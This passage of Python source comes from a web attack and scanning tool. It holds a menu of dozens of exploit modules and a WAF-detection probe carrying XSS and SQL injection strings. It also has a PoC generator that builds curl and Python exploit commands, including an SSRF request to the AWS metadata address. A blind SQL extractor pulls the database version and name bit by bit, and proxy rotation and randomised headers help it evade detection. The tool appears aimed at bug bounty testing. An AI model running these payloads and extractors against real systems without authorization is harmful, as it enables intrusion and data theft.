        self.console.print("  [dim][55][/dim]  🔑  Auth / Weak Creds")
        self.console.print("  [dim][56][/dim]  💉  Blind SQL Extractor")
        self.console.print("  [dim][57][/dim]  📋  PoC Generator (from last scan)")
        self.console.print("  [dim][58][/dim]  🌐  Generate HTML Report (from JSON)")
        self.console.print("  [dim][59][/dim]  ⏱  Rate Limit Checker")
        self.console.print("  [dim][60][/dim]  🛡  DoS Protection Verifier")
        self.console.print("  [dim][61][/dim]  📄  HackerOne Report Generator")
        self.console.print("  [bold yellow][62][/bold yellow]  🔎  Recon + Param Discovery + Info Disclosure")
        self.console.print("  [cyan]────────────────────────────────────[/cyan]")
        self.console.print("  [bold green][99][/bold green]  Full Scan — All modules (progressive)")

        _valid = {str(i) for i in range(63)} | {'99', 'A', 'B', 'C', 'D', 'E', 'F'}
        while True:
            raw = input("\nEnter choice: ").strip().upper()
            normalized = raw.lstrip('0') or '0'
            if raw in ('99','A','B','C','D','E','F'):
                return raw
            if normalized in _valid:
                return normalized
            self.console.print("[red]Invalid choice. Enter 00–62, A–F, or 99.[/red]")

    def get_single_url(self) -> str:
        while True:
            url = input("\nEnter URL to scan: ").strip()
            if url:
                return url
            self.console.print("[red]URL cannot be empty.[/red]")

    def get_file_path(self) -> str:
        while True:
            file_path = input("\nEnter file path: ").strip()
            if file_path and Path(file_path).exists():
                return file_path
            self.console.print("[red]File not found. Please enter a valid path.[/red]")

    def display_comprehensive_result(self, result: ComprehensiveScanResult):

        tree = Tree(f"[bold cyan]🔍 Security Scan Results[/bold cyan]\n[dim]{result.url}[/dim]")

        if result.virustotal is not None:
            vt = result.virustotal
            if vt.error:
                tree.add(f"[yellow]🔎 VirusTotal: {vt.error}[/yellow]")
            else:
                color = self._get_verdict_color(vt.verdict)
                vt_branch = tree.add(f"[{color}]🔎 VirusTotal: {vt.verdict.value}[/{color}]")
                vt_branch.add(f"Malicious  : [red]{vt.malicious}[/red]")
                vt_branch.add(f"Suspicious : [yellow]{vt.suspicious}[/yellow]")
                vt_branch.add(f"Harmless   : [green]{vt.harmless}[/green]")
                vt_branch.add(f"Engines    : {vt.total_engines}")

        def _add_vulns(branch_label, vulns, color="red"):
            if not vulns:
                return  # Only show if found — no "Clean" noise
            branch = tree.add(f"[{color}]{branch_label}: {len(vulns)} found[/{color}]")
            for idx, v in enumerate(vulns, 1):
                node = branch.add(f"[bold]#{idx}[/bold]")
                sev_c = {"CRITICAL":"bold red","HIGH":"red","MEDIUM":"yellow","LOW":"dim"}.get(v.severity, "white")
                node.add(f"Severity   : [{sev_c}]{v.severity}[/{sev_c}]")
                if v.subtype:
                    node.add(f"Type       : [cyan]{v.subtype}[/cyan]")
                node.add(f"URL        : [dim]{v.url}[/dim]")
                node.add(f"Parameter  : {', '.join(v.vulnerable_params)}")
                node.add(f"[yellow]PoC        : {v.payload_used}[/yellow]")
                node.add(f"Evidence   : {v.evidence}")
                node.add(f"Details    : {v.details}")
                if v.impact:
                    node.add(f"Impact     : [bold red]{v.impact}[/bold red]")

        if result.sqli_vulnerabilities is not None:
            _add_vulns("💉 SQL Injection", result.sqli_vulnerabilities)

        if result.xss_vulnerabilities is not None:
            _add_vulns("⚡ XSS", result.xss_vulnerabilities)

        if result.idor_vulnerabilities is not None:
            _add_vulns("🔓 IDOR", result.idor_vulnerabilities)

        if result.csrf_vulnerabilities is not None:
            if result.csrf_vulnerabilities:
                branch = tree.add(f"[yellow]🛡 CSRF: {len(result.csrf_vulnerabilities)} issue(s) found[/yellow]")
                for idx, v in enumerate(result.csrf_vulnerabilities, 1):
                    node = branch.add(f"[bold]#{idx}[/bold]")
                    node.add(f"Severity   : [yellow]{v.severity}[/yellow]")
                    if v.subtype:
                        node.add(f"Type       : [cyan]{v.subtype}[/cyan]")
                    node.add(f"Target     : {', '.join(v.vulnerable_params)}")
                    node.add(f"[yellow]PoC        : {v.payload_used}[/yellow]")
                    node.add(f"Evidence   : {v.evidence}")
                    node.add(f"Details    : {v.details}")
                    if v.impact:
                        node.add(f"Impact     : [bold red]{v.impact}[/bold red]")

        if result.rce_vulnerabilities is not None:
            _add_vulns("💀 RCE", result.rce_vulnerabilities, color="bold red")

        if result.lfi_vulnerabilities is not None:
            _add_vulns("📂 LFI", result.lfi_vulnerabilities, color="red")

        if result.rfi_vulnerabilities is not None:
            _add_vulns("🌍 RFI", result.rfi_vulnerabilities, color="red")

        if result.ssrf_vulnerabilities is not None:
            _add_vulns("🔁 SSRF", result.ssrf_vulnerabilities, color="red")

        if result.fileupload_vulnerabilities is not None:
            _add_vulns("📤 File Upload", result.fileupload_vulnerabilities, color="red")

        if result.secmisconf_vulnerabilities is not None:
            _add_vulns("⚙ Security Misconfiguration", result.secmisconf_vulnerabilities, color="yellow")

        if result.sdt_vulnerabilities is not None:
            _add_vulns("🌐 Subdomain Takeover", result.sdt_vulnerabilities, color="magenta")

        if result.openredirect_vulnerabilities is not None:
            _add_vulns("↪ Open Redirect", result.openredirect_vulnerabilities, color="yellow")

        if result.cors_vulnerabilities is not None:
            _add_vulns("🌍 CORS Misconfiguration", result.cors_vulnerabilities, color="yellow")

        if result.hostheader_vulnerabilities is not None:
            _add_vulns("🏠 Host Header Injection", result.hostheader_vulnerabilities, color="red")

        if result.xxe_vulnerabilities is not None:
            _add_vulns("📄 XXE Injection", result.xxe_vulnerabilities, color="bold red")

        if result.dirlist_vulnerabilities is not None:
            _add_vulns("📁 Directory Listing", result.dirlist_vulnerabilities, color="yellow")

        if result.jwt_vulnerabilities is not None:
            _add_vulns("🔑 JWT Vulnerability", result.jwt_vulnerabilities, color="bold red")

        if result.graphql_vulnerabilities is not None:
            _add_vulns("📡 GraphQL", result.graphql_vulnerabilities, color="yellow")

        if result.crlf_vulnerabilities is not None:
            _add_vulns("↵ CRLF Injection", result.crlf_vulnerabilities, color="red")

        if result.prototype_vulnerabilities is not None:
            _add_vulns("⚗ Prototype Pollution", result.prototype_vulnerabilities, color="red")

        if result.deserial_vulnerabilities is not None:
            _add_vulns("📦 Insecure Deserialization", result.deserial_vulnerabilities, color="bold red")

        if result.bizlogic_vulnerabilities is not None:
            _add_vulns("💼 Business Logic", result.bizlogic_vulnerabilities, color="yellow")

        if result.race_vulnerabilities is not None:
            _add_vulns("⚡ Race Condition", result.race_vulnerabilities, color="red")

        if result.clickjacking_vulnerabilities is not None:
            _add_vulns("🖱 Clickjacking", result.clickjacking_vulnerabilities, color="yellow")

        if result.sensitive_vulnerabilities is not None:
            _add_vulns("🔐 Sensitive Data Exposure", result.sensitive_vulnerabilities, color="bold red")

        if result.hpp_vulnerabilities is not None:
            _add_vulns("🔀 HTTP Parameter Pollution", result.hpp_vulnerabilities, color="yellow")

        if result.enum_vulnerabilities is not None:
            _add_vulns("👤 Account Enumeration", result.enum_vulnerabilities, color="yellow")

        if result.mfa_vulnerabilities is not None:
            _add_vulns("🔓 2FA / OTP Bypass", result.mfa_vulnerabilities, color="red")

        if result.smuggling_vulnerabilities is not None:
            _add_vulns("🚇 HTTP Request Smuggling", result.smuggling_vulnerabilities, color="bold red")

        if result.ssti_vulns is not None:
            _add_vulns("🧩 SSTI", result.ssti_vulns, color="bold red")
        if result.nosqli_vulns is not None:
            _add_vulns("🍃 NoSQL Injection", result.nosqli_vulns, color="bold red")
        if result.massassign_vulns is not None:
            _add_vulns("📝 Mass Assignment", result.massassign_vulns, color="yellow")
        if result.jwt_conf_vulns is not None:
            _add_vulns("🔑 JWT Confusion", result.jwt_conf_vulns, color="bold red")
        if result.cache_vulns is not None:
            _add_vulns("🗄 Cache Poisoning", result.cache_vulns, color="red")
        if result.websocket_vulns is not None:
            _add_vulns("🔌 WebSocket Injection", result.websocket_vulns, color="yellow")
        if result.path_trav_vulns is not None:
            _add_vulns("📁 Path Traversal", result.path_trav_vulns, color="red")
        if result.api_abuse_vulns is not None:
            _add_vulns("🔢 API Versioning Abuse", result.api_abuse_vulns, color="yellow")
        if result.bopla_vulns is not None:
            _add_vulns("🏠 BOPLA", result.bopla_vulns, color="yellow")
        if result.ldap_vulns is not None:
            _add_vulns("📋 LDAP Injection", result.ldap_vulns, color="red")
        if result.xml_vulns is not None:
            _add_vulns("📄 XML Injection", result.xml_vulns, color="yellow")
        if result.verb_vulns is not None:
            _add_vulns("🔧 Verb Tampering", result.verb_vulns, color="yellow")
        if result.shellshock_vulns is not None:
            _add_vulns("💥 Shellshock", result.shellshock_vulns, color="bold red")
        if result.log4shell_vulns is not None:
            _add_vulns("☠ Log4Shell", result.log4shell_vulns, color="bold red")
        if result.spring_vulns is not None:
            _add_vulns("🌱 Spring4Shell", result.spring_vulns, color="bold red")
        if result.ssi_vulns is not None:
            _add_vulns("📎 SSI Injection", result.ssi_vulns, color="red")
        if result.csti_vulns is not None:
            _add_vulns("🌐 CSTI", result.csti_vulns, color="red")

        overall_color = self._get_verdict_color(result.overall_verdict)
        tree.add(f"\n[{overall_color}]⚑ Overall Verdict: {result.overall_verdict.value}[/{overall_color}]")

        self.console.print("\n")
        self.console.print(tree)
        self.console.print(f"\n[dim]Scan completed at: {result.timestamp}[/dim]\n")

    def display_multiple_results(self, results: List[ComprehensiveScanResult]):

        table = Table(
            title="\n Security Scan Results Summary",
            box=box.ROUNDED,
            show_header=True,
            header_style="bold cyan"
        )

        table.add_column("URL", style="white", no_wrap=False, width=35)
        table.add_column("VT Status", justify="center", width=12)
        table.add_column("SQLi", justify="center", width=8)
        table.add_column("XSS", justify="center", width=8)
        table.add_column("Overall", justify="center", width=12)

        for result in results:
            if result.virustotal and not result.virustotal.error:
                vt_color = self._get_verdict_color(result.virustotal.verdict)
                vt_status = f"[{vt_color}]{result.virustotal.verdict.value}[/{vt_color}]"
            else:
                vt_status = "[dim]N/A[/dim]"

            sqli_count = len(result.sqli_vulnerabilities or [])
            if sqli_count > 0:
                sqli_status = f"[red]{sqli_count} vuln[/red]"
            else:
                sqli_status = "[green]Clean[/green]"

            xss_count = len(result.xss_vulnerabilities or [])
            if xss_count > 0:
                xss_status = f"[red]{xss_count} vuln[/red]"
            else:
                xss_status = "[green]Clean[/green]"

            overall_color = self._get_verdict_color(result.overall_verdict)
            overall_status = f"[{overall_color}]{result.overall_verdict.value}[/{overall_color}]"

            table.add_row(
                result.url[:35] + "..." if len(result.url) > 35 else result.url,
                vt_status,
                sqli_status,
                xss_status,
                overall_status
            )

        self.console.print(table)
        self._display_summary(results)

    def _display_summary(self, results: List[ComprehensiveScanResult]):
        total = len(results)
        safe = sum(1 for r in results if r.overall_verdict == Verdict.SAFE)
        vulnerable = sum(1 for r in results if r.overall_verdict == Verdict.VULNERABLE)
        suspicious = sum(1 for r in results if r.overall_verdict == Verdict.SUSPICIOUS)
        malicious = sum(1 for r in results if r.overall_verdict == Verdict.MALICIOUS)

        total_sqli = sum(len(r.sqli_vulnerabilities or []) for r in results)
        total_xss = sum(len(r.xss_vulnerabilities or []) for r in results)

        summary = f"""
[bold]Summary:[/bold]
  Total Scanned:        {total}
  Safe:                 [green]{safe}[/green]
  Vulnerable:           [red]{vulnerable}[/red]
  Suspicious:           [yellow]{suspicious}[/yellow]
  Malicious:            [red]{malicious}[/red]

[bold]Vulnerabilities Found:[/bold]
  SQL Injection:        [red]{total_sqli}[/red]
  XSS:                  [red]{total_xss}[/red]
  Total:                [red]{total_sqli + total_xss}[/red]
        """

        self.console.print(Panel(
            summary.strip(),
            title="📊 Scan Summary",
            border_style="cyan",
            box=box.ROUNDED
        ))

    def _get_verdict_color(self, verdict: Verdict) -> str:
        return {
            Verdict.SAFE: "green",
            Verdict.SUSPICIOUS: "yellow",
            Verdict.MALICIOUS: "red",
            Verdict.VULNERABLE: "red",
            Verdict.UNKNOWN: "dim"
        }.get(verdict, "white")

    def ask_save_results(self) -> Optional[str]:
        save = input("\nSave results to JSON file? (y/n): ").strip().lower()
        if save == 'y':
            filename = input("Enter filename (default: security_scan_results.json): ").strip()
            return filename if filename else "security_scan_results.json"
        return None



# ══════════════════════════════════════════════════════════════════════════════
#  ASYNC RATE-LIMITED CLIENT FACTORY
# ══════════════════════════════════════════════════════════════════════════════
class RateLimitedClient:
    """
    Drop-in wrapper: enforces concurrency cap + per-request delay.
    Usage:  async with RateLimitedClient(config) as client: ...
    """
    def __init__(self, config: Config, extra_headers: Optional[dict] = None):
        self.config = config
        self._sem   = asyncio.Semaphore(config.concurrency)
        kw = config.build_client_kwargs()
        h  = random_headers()
        if extra_headers:
            h.update(extra_headers)
        kw["headers"] = h
        self._client  = httpx.AsyncClient(**kw)

    async def __aenter__(self):
        await self._client.__aenter__()
        return self

    async def __aexit__(self, *a):
        await self._client.__aexit__(*a)

    async def _delay(self):
        d = self.config.req_delay
        if d > 0:
            if self.config.req_delay_random:
                d *= random.uniform(0.5, 1.5)
            await asyncio.sleep(d)

    def _rotate_proxy(self):
        """Rotate to next proxy if proxy list is active."""
        pl = self.config.proxy_list
        if pl:
            self.config.proxy_index = (self.config.proxy_index + 1) % len(pl)
            self.config.proxy       = pl[self.config.proxy_index]
            # Rebuild client proxy setting
            try:
                self._client._transport._pool._proxy_url = self.config.proxy
            except Exception:
                pass  # proxy rotation applied on next client init

    async def get(self, url, **kw):
        async with self._sem:
            await self._delay()
            r = await self._client.get(url, **kw)
            self._rotate_proxy()
            return r

    async def post(self, url, **kw):
        async with self._sem:
            await self._delay()
            r = await self._client.post(url, **kw)
            self._rotate_proxy()
            return r

    async def request(self, method, url, **kw):
        async with self._sem:
            await self._delay()
            r = await self._client.request(method, url, **kw)
            self._rotate_proxy()
            return r

    @property
    def cookies(self): return self._client.cookies


# ══════════════════════════════════════════════════════════════════════════════
#  WAF DETECTION ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class WAFDetector:
    """
    Detects WAF presence before scanning.
    Strategy: send a clearly malicious probe — WAF intercepts it differently.
    """
    _PROBE    = "/?y2s=<script>alert(1)</script>&id=1' OR 1=1--"
    _SIGNATURES = {
        "Cloudflare":   [r"cloudflare", r"cf-ray", r"__cfduid", r"attention required.*cloudflare"],
        "AWS WAF":      [r"x-amzn-requestid", r"awselb", r"x-amz-cf-id"],
        "Akamai":       [r"akamai", r"ak-context", r"x-check-cacheable"],
        "Imperva":      [r"incapsula", r"x-iinfo", r"visid_incap"],
        "Sucuri":       [r"sucuri", r"x-sucuri-id"],
        "F5 BIG-IP":    [r"bigip", r"f5", r"ts[a-f0-9]{8}"],
        "Barracuda":    [r"barracuda", r"barra_counter_session"],
        "ModSecurity":  [r"mod_security", r"modsecurity", r"owasp crs"],
        "Nginx":        [r"nginx.*403", r"<center>nginx</center>"],
        "Generic":      [r"your request has been blocked", r"access denied",
                         r"security violation", r"illegal access"],
    }

    def __init__(self, config: Config, console):
        self.config  = config
        self.console = console

    async def detect(self, url: str) -> dict:
        """Returns {detected: bool, waf: str, confidence: str}"""
        result = {"detected": False, "waf": None, "confidence": "none", "details": ""}
        try:
            parsed   = urllib.parse.urlparse(url)
            base     = f"{parsed.scheme}://{parsed.netloc}"
            probe_url = base + self._PROBE

            async with httpx.AsyncClient(
                headers=random_headers(), verify=False,
                follow_redirects=False, timeout=10
            ) as cl:
                # Baseline — normal request
                r_base  = await cl.get(base, timeout=10)
                r_probe = await cl.get(probe_url, timeout=10)

            base_status  = r_base.status_code
            probe_status = r_probe.status_code
            probe_body   = r_probe.text.lower()
            probe_hdrs   = {k.lower(): v.lower() for k, v in r_probe.headers.items()}
            all_text     = probe_body + " ".join(probe_hdrs.values())

            # Status-based detection
            if probe_status in (403, 406, 429, 503) and base_status not in (403, 406, 429, 503):
                result["detected"]   = True
                result["confidence"] = "high"

            # Signature-based detection
            for waf_name, patterns in self._SIGNATURES.items():
                for pat in patterns:
                    if re.search(pat, all_text, re.IGNORECASE):
                        result["detected"]   = True
                        result["waf"]        = waf_name
                        result["confidence"] = "high"
                        result["details"]    = f"Matched pattern: {pat}"
                        return result

            if result["detected"] and not result["waf"]:
                result["waf"]     = "Unknown WAF"
                result["details"] = f"Malicious probe returned HTTP {probe_status}, normal request returned {base_status}"

        except Exception as e:
            result["details"] = str(e)
        return result


# ══════════════════════════════════════════════════════════════════════════════
#  RESPONSE DIFFING ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class ResponseDiffer:
    """
    Compares responses to detect blind/boolean-based injection points.
    Three-response model: baseline, true-condition, false-condition.
    """
    @staticmethod
    def similarity(a: str, b: str) -> float:
        if not a and not b: return 1.0
        if not a or not b:  return 0.0
        la, lb = len(a), len(b)
        if la == 0 or lb == 0: return 0.0
        return 1.0 - abs(la - lb) / max(la, lb)

    @staticmethod
    def meaningful_diff(baseline: str, true_r: str, false_r: str) -> dict:
        """
        Returns analysis dict with boolean-diff signal strength.
        Strong signal: true_r similar to baseline, false_r very different.
        """
        sim_true  = ResponseDiffer.similarity(baseline, true_r)
        sim_false = ResponseDiffer.similarity(baseline, false_r)
        delta     = abs(sim_true - sim_false)
        signal    = "strong" if delta > 0.3 else "medium" if delta > 0.1 else "weak"
        return {
            "sim_true":  round(sim_true,  3),
            "sim_false": round(sim_false, 3),
            "delta":     round(delta,     3),
            "signal":    signal,
            "injectable": delta > 0.1,
        }

    @staticmethod
    def time_diff_signal(baseline_t: float, payload_t: float,
                         control_t: float, threshold: float = 2.5) -> dict:
        """
        Time-based blind injection signal.
        payload_t should be significantly longer than baseline_t and control_t.
        """
        avg_normal = (baseline_t + control_t) / 2
        ratio      = payload_t / max(avg_normal, 0.01)
        return {
            "baseline_avg": round(avg_normal, 2),
            "payload_time": round(payload_t,  2),
            "ratio":        round(ratio,      2),
            "injectable":   ratio >= threshold and payload_t >= 3.0,
        }


# ══════════════════════════════════════════════════════════════════════════════
#  CVSS v3.1 SCORING ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class CVSSScorer:
    """
    Calculates CVSS v3.1 Base Score for a VulnerabilityResult.
    Maps vuln type + severity → AV/AC/PR/UI/S/C/I/A vectors automatically.
    """

    # (AV, AC, PR, UI, S, C, I, A) tuples per VulnType
    _VECTORS: dict = {
        VulnerabilityType.SQLI:        ("N","L","N","N","U","H","H","H"),
        VulnerabilityType.XSS:         ("N","L","N","R","C","L","N","N"),
        VulnerabilityType.RCE:         ("N","L","N","N","C","H","H","H"),
        VulnerabilityType.LFI:         ("N","L","N","N","U","H","N","N"),
        VulnerabilityType.RFI:         ("N","L","N","N","C","H","H","H"),
        VulnerabilityType.SSRF:        ("N","L","N","N","C","H","L","N"),
        VulnerabilityType.XXE:         ("N","L","N","N","U","H","L","N"),
        VulnerabilityType.IDOR:        ("N","L","L","N","U","H","L","N"),
        VulnerabilityType.CSRF:        ("N","L","N","R","U","N","L","N"),
        VulnerabilityType.HOSTHEADER:  ("N","L","N","R","C","L","L","N"),
        VulnerabilityType.OPEN_REDIRECT:("N","L","N","R","U","N","L","N"),
        VulnerabilityType.CORS:        ("N","L","N","R","U","H","N","N"),
        VulnerabilityType.JWT:         ("N","L","N","N","U","H","H","N"),
        VulnerabilityType.SECMISCONF:  ("N","L","N","N","U","L","N","N"),
        VulnerabilityType.SDTAKEOVER:  ("N","L","N","N","U","L","L","N"),
        VulnerabilityType.SSTI:        ("N","L","N","N","C","H","H","H"),
        VulnerabilityType.NOSQLI:      ("N","L","N","N","U","H","H","H"),
        VulnerabilityType.SHELLSHOCK:  ("N","L","N","N","C","H","H","H"),
        VulnerabilityType.LOG4SHELL:   ("N","L","N","N","C","H","H","H"),
        VulnerabilityType.SPRING4SHELL:("N","L","N","N","C","H","H","H"),
        VulnerabilityType.SMUGGLING:   ("N","H","N","N","C","H","L","N"),
        VulnerabilityType.CACHE_POISON:("N","H","N","N","C","H","L","N"),
        VulnerabilityType.MASSASSIGN:  ("N","L","L","N","U","H","H","N"),
        VulnerabilityType.CRLF:        ("N","L","N","R","U","L","L","N"),
        VulnerabilityType.DESERIAL:    ("N","L","N","N","U","H","H","H"),
        VulnerabilityType.CLICKJACKING:("N","L","N","R","U","N","L","N"),
        VulnerabilityType.SENSITIVE:   ("N","L","N","N","U","H","N","N"),
        VulnerabilityType.VERB_TAMPER: ("N","L","N","N","U","L","N","N"),
        VulnerabilityType.LDAP_INJ:    ("N","L","N","N","U","H","H","N"),
    }
    _DEFAULT = ("N","L","N","N","U","L","L","N")

    # CVSS v3.1 numeric maps
    _AV  = {"N":0.85,"A":0.62,"L":0.55,"P":0.2}
    _AC  = {"L":0.77,"H":0.44}
    _PR  = {"N":0.85,"L":0.62,"H":0.27}
    _PR_S= {"N":0.85,"L":0.68,"H":0.50}  # when Scope=Changed
    _UI  = {"N":0.85,"R":0.62}
    _C_I_A={"N":0.0,"L":0.22,"H":0.56}

    @classmethod
    def score(cls, vuln: VulnerabilityResult) -> dict:
        vec = cls._VECTORS.get(vuln.vulnerability_type, cls._DEFAULT)
        av,ac,pr,ui,s,c,i,a = vec
        scope_changed = s == "C"

        _av  = cls._AV[av]
        _ac  = cls._AC[ac]
        _pr  = (cls._PR_S if scope_changed else cls._PR)[pr]
        _ui  = cls._UI[ui]
        _c   = cls._C_I_A[c]
        _i   = cls._C_I_A[i]
        _a   = cls._C_I_A[a]

        iss_sub = 1 - ((1-_c)*(1-_i)*(1-_a))
        iss     = (6.42 * iss_sub) if not scope_changed else (7.52*(iss_sub-0.029) - 3.25*((iss_sub-0.02)**15))

        exploitability = 8.22 * _av * _ac * _pr * _ui
        if iss <= 0:
            base = 0.0
        elif not scope_changed:
            base = min(iss + exploitability, 10)
        else:
            base = min(1.08*(iss + exploitability), 10)

        # Round up to 1 decimal
        import math
        base = math.ceil(base * 10) / 10

        rating = ("None" if base == 0 else "Low" if base < 4 else
                  "Medium" if base < 7 else "High" if base < 9 else "Critical")
        vector_str = f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"
        return {"score": base, "rating": rating, "vector": vector_str}


# ══════════════════════════════════════════════════════════════════════════════
#  PoC GENERATOR
# ══════════════════════════════════════════════════════════════════════════════
class PoCGenerator:
    """Generates curl + Python PoC code for each confirmed vulnerability."""

    @staticmethod
    def generate(vuln: VulnerabilityResult) -> str:
        url     = vuln.url
        params  = ', '.join(vuln.vulnerable_params)
        payload = vuln.payload_used or ""
        vtype   = vuln.vulnerability_type

        lines = [
            f"# ── PoC: {vuln.subtype or vtype.value} ──────────────────",
            f"# Severity : {vuln.severity}",
            f"# Parameter: {params}",
            f"# Evidence : {vuln.evidence}",
            "",
        ]

        # Build curl command
        parsed = urllib.parse.urlparse(url)
        qs     = dict(urllib.parse.parse_qsl(parsed.query))
        param  = vuln.vulnerable_params[0] if vuln.vulnerable_params else "param"

        if vtype in (VulnerabilityType.SQLI, VulnerabilityType.XSS,
                     VulnerabilityType.LFI,  VulnerabilityType.SSTI,
                     VulnerabilityType.NOSQLI):
            qs[param] = payload
            poc_url   = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urllib.parse.urlencode(qs), parsed.fragment))
            lines += [
                f"# curl PoC",
                f'curl -sk "{poc_url}"',
                "",
                "# Python PoC",
                "import requests",
                f'r = requests.get("{poc_url}", verify=False)',
                "print(r.status_code, r.text[:500])",
            ]

        elif vtype in (VulnerabilityType.HOSTHEADER, VulnerabilityType.CRLF,
                       VulnerabilityType.SHELLSHOCK, VulnerabilityType.LOG4SHELL):
            header_name = param if "header" not in param.lower() else "Host"
            lines += [
                f"# curl PoC",
                f'curl -sk -H "{header_name}: {payload}" "{url}"',
                "",
                "# Python PoC",
                "import requests",
                f'r = requests.get("{url}", headers={{"{header_name}": "{payload}"}}, verify=False)',
                "print(r.status_code, r.text[:500])",
            ]

        elif vtype == VulnerabilityType.SSRF:
            qs[param] = "http://169.254.169.254/latest/meta-data/"
            poc_url   = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urllib.parse.urlencode(qs), parsed.fragment))
            lines += [
                "# curl PoC (AWS metadata SSRF)",
                f'curl -sk "{poc_url}"',
                "",
                "# Python PoC",
                "import requests",
                f'r = requests.get("{poc_url}", verify=False)',
                "print(r.text[:1000])",
            ]

        elif vtype == VulnerabilityType.MASSASSIGN:
            lines += [
                "# curl PoC (JSON POST with extra fields)",
                f'curl -sk -X POST "{url}" \\',
                '  -H "Content-Type: application/json" \\',
                f'  -d \'{{"username":"test","password":"test","{param}":"{payload}"}}\'',
                "",
                "# Python PoC",
                "import requests",
                f'r = requests.post("{url}", json={{"username":"test","password":"test","{param}":"{payload}"}}, verify=False)',
                "print(r.status_code, r.text[:500])",
            ]

        elif vtype in (VulnerabilityType.SPRING4SHELL, VulnerabilityType.LOG4SHELL):
            lines += [
                "# curl PoC",
                f'curl -sk -X POST "{url}" \\',
                f'  -d "{payload[:200]}"',
            ]

        else:
            lines += [
                f"# curl PoC",
                f'curl -sk "{url}" --data-urlencode "{param}={payload}"',
                "",
                "# Python PoC",
                "import requests",
                f'r = requests.get("{url}", params={{"{param}": "{payload}"}}, verify=False)',
                "print(r.status_code, r.text[:500])",
            ]

        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
#  BLIND SQL EXTRACTOR  (DB name + version only — confirmation tool)
# ══════════════════════════════════════════════════════════════════════════════
class BlindSQLExtractor:
    """
    Confirms blind SQL injection by extracting DB banner (version + db name).
    Uses boolean-based bit-extraction. Non-destructive read-only.
    """

    _TRUE_COND  = "' AND 1=1--"
    _FALSE_COND = "' AND 1=2--"

    # MySQL/MariaDB — extract VERSION() char by char
    _MYSQL_VER  = lambda self, pos, bit: (
        f"' AND (ORD(SUBSTR(VERSION(),{pos},1))>>({bit}-1))&1=1--"
    )
    _MYSQL_DB   = lambda self, pos, bit: (
        f"' AND (ORD(SUBSTR(DATABASE(),{pos},1))>>({bit}-1))&1=1--"
    )

    def __init__(self, config: Config):
        self.config  = config
        self.differ  = ResponseDiffer()

    async def _baseline(self, client, url: str, param: str, params: dict) -> tuple:
        """Returns (baseline_text, true_text, false_text) — or None on fail."""
        try:
            base = await client.get(url, timeout=self.config.vuln_timeout)
            pu   = urllib.parse.urlparse(url)

            tp   = params.copy(); tp[param] = [self._TRUE_COND]
            tq   = urllib.parse.urlencode(tp, doseq=True)
            r_t  = await client.get(
                urllib.parse.urlunparse((pu.scheme, pu.netloc, pu.path, pu.params, tq, "")),
                timeout=self.config.vuln_timeout)

            tp[param] = [self._FALSE_COND]
            tq   = urllib.parse.urlencode(tp, doseq=True)
            r_f  = await client.get(
                urllib.parse.urlunparse((pu.scheme, pu.netloc, pu.path, pu.params, tq, "")),
                timeout=self.config.vuln_timeout)

            return base.text, r_t.text, r_f.text
        except Exception:
            return None

    async def _extract_char(self, client, url: str, param: str,
                             params: dict, bit_fn, true_body: str, false_body: str,
                             pos: int) -> Optional[str]:
        """Extract one character at position `pos` via bit-extraction."""
        char_val = 0
        for bit in range(1, 8):
            payload = bit_fn(pos, bit)
            try:
                tp = params.copy(); tp[param] = [payload]
                tq = urllib.parse.urlencode(tp, doseq=True)
                pu = urllib.parse.urlparse(url)
                tu = urllib.parse.urlunparse((pu.scheme, pu.netloc, pu.path,
                                              pu.params, tq, pu.fragment))
                r  = await client.get(tu, timeout=self.config.vuln_timeout)
                sim_true  = ResponseDiffer.similarity(r.text, true_body)
                sim_false = ResponseDiffer.similarity(r.text, false_body)
                if sim_true > sim_false:
                    char_val |= (1 << (bit - 1))
                await asyncio.sleep(0.05)
            except Exception:
                pass
        return chr(char_val) if 32 <= char_val < 127 else None

    async def extract(self, url: str, param: str, console) -> dict:
        """
        Try to extract DB version + name.
        Returns {success, version, db_name, method}.
        Only retrieves first 20 chars of each — enough to confirm injectable.
        """
        result = {"success": False, "version": "", "db_name": "", "method": "blind boolean"}

        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if param not in params:
            return result

        async with httpx.AsyncClient(
            headers=random_headers(), verify=False,
            follow_redirects=True
        ) as client:
            bl = await self._baseline(client, url, param, params)
            if not bl:
                return result
            base_body, true_body, false_body = bl
            diff = ResponseDiffer.meaningful_diff(base_body, true_body, false_body)
            if not diff["injectable"]:
                result["method"] = "no blind signal detected"
                return result

            console.print("[dim]  Extracting DB version (up to 20 chars)...[/dim]")
            ver_chars = []
            for pos in range(1, 21):
                c = await self._extract_char(client, url, param, params,
                                              self._MYSQL_VER, true_body, false_body, pos)
                if c and c != '\x00':
                    ver_chars.append(c)
                else:
                    break

            console.print("[dim]  Extracting DB name (up to 20 chars)...[/dim]")
            db_chars = []
            for pos in range(1, 21):
                c = await self._extract_char(client, url, param, params,
                                              self._MYSQL_DB, true_body, false_body, pos)
                if c and c != '\x00':
                    db_chars.append(c)
                else:
                    break

            result["version"]  = "".join(ver_chars).strip()
            result["db_name"]  = "".join(db_chars).strip()
            result["success"]  = bool(result["version"] or result["db_name"])
        return result


# ══════════════════════════════════════════════════════════════════════════════
#  PARAMETER DISCOVERY (wordlist-based)
# ══════════════════════════════════════════════════════════════════════════════
class ParamDiscovery:
    """
    Discovers hidden/undocumented URL parameters via wordlist probing.
    Signals: response size change, new content, different status code.
    """

    _WORDLIST = [
        "id","user","username","email","pass","password","token","key","api_key",
        "secret","auth","session","debug","admin","test","page","limit","offset",
        "sort","order","filter","q","query","search","file","path","url","src",
        "redirect","next","return","callback","ref","type","action","method",
        "lang","locale","format","output","view","template","theme","module",
        "plugin","config","data","payload","cmd","exec","code","script",
        "include","load","fetch","get","post","put","delete","update","create",
        "read","write","upload","download","export","import","backup","restore",
        "log","trace","verbose","version","mode","env","environment","host",
        "port","ip","address","domain","site","blog","feed","rss","xml","json",
        "csv","pdf","doc","report","result","response","status","error","msg",
        "message","notification","alert","warn","info","success","fail",
        "access","role","group","perm","privilege","scope","grant","claim",
